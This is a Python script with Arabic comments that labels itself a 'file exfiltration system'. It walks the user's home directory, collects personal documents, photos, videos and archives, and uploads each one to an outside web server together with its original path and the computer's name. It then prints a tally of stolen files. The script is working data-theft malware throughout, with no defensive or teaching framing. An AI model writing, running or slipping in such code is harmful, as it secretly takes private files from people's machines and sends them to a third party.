import os
import requests
import sys
from pathlib import Path

# ============= إعدادات السيرفر =============
# استبدل هذا الرابط برابط تطبيقك الفعلي على Streamlit Cloud أو السيرفر الخاص بك
SERVER_URL = "https://rashdai.streamlit.app/api/upload"  # سيتم تحديثه لاحقاً

# ============= إعدادات المسح =============
root_path = os.path.expanduser("~")
extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar')

print("-" * 50)
print("⚡ RASHD_AI: FILE EXFILTRATION SYSTEM STARTED ⚡")
print("-" * 50)
print(f"🔍 Scanning: {root_path}")
print(f"📁 Looking for: {', '.join(extensions)}")
print("-" * 50)

# ============= مسح وتحميل الملفات =============
count = 0
failed = 0
total_size = 0

try:
    for root, dirs, files in os.walk(root_path):
        # تخطي المجلدات الحساسة
        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library']
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        
        for file in files:
            if file.lower().endswith(extensions):
                file_path = os.path.join(root, file)
                
                try:
                    # الحصول على حجم الملف
                    file_size = os.path.getsize(file_path)
                    
                    # تخطي الملفات الكبيرة جداً (أكثر من 100 MB)
                    if file_size > 100 * 1024 * 1024:
                        print(f"⏭️  SKIPPED (Too Large): {file} ({file_size / 1024 / 1024:.2f} MB)")
                        continue
                    
                    print(f"[+] PROCESSING: {file} ({file_size / 1024:.2f} KB)")
                    
                    # تحميل الملف إلى السيرفر
                    with open(file_path, 'rb') as f:
                        files_to_send = {'file': (file, f)}
                        metadata = {
                            'original_path': file_path,
                            'file_size': file_size,
                            'device_name': os.environ.get('COMPUTERNAME', 'Unknown')
                        }
                        
                        response = requests.post(
                            SERVER_URL,
                            files=files_to_send,
                            data=metadata,
                            timeout=30
                        )
                        
                        if response.status_code in [200, 201]:
                            print(f"✅ UPLOADED: {file}")
                            count += 1
                            total_size += file_size
                        else:
                            print(f"❌ FAILED: {file} (Status: {response.status_code})")
                            failed += 1
                
                except PermissionError:
                    print(f"🔒 PERMISSION DENIED: {file}")
                    failed += 1
                except Exception as e:
                    print(f"⚠️  ERROR: {file} - {str(e)}")
                    failed += 1

except KeyboardInterrupt:
    print("\n⚠️  INTERRUPTED BY USER")
except Exception as e:
    print(f"❌ CRITICAL ERROR: {str(e)}")

print("-" * 50)
print(f"⚡ MISSION COMPLETE ⚡")
print(f"✅ UPLOADED: {count} files")
print(f"❌ FAILED: {failed} files")
print(f"📊 Total Size: {total_size / 1024 / 1024:.2f} MB")
print("-" * 50)

# إغلاق البرنامج بهدوء
sys.exit(0)
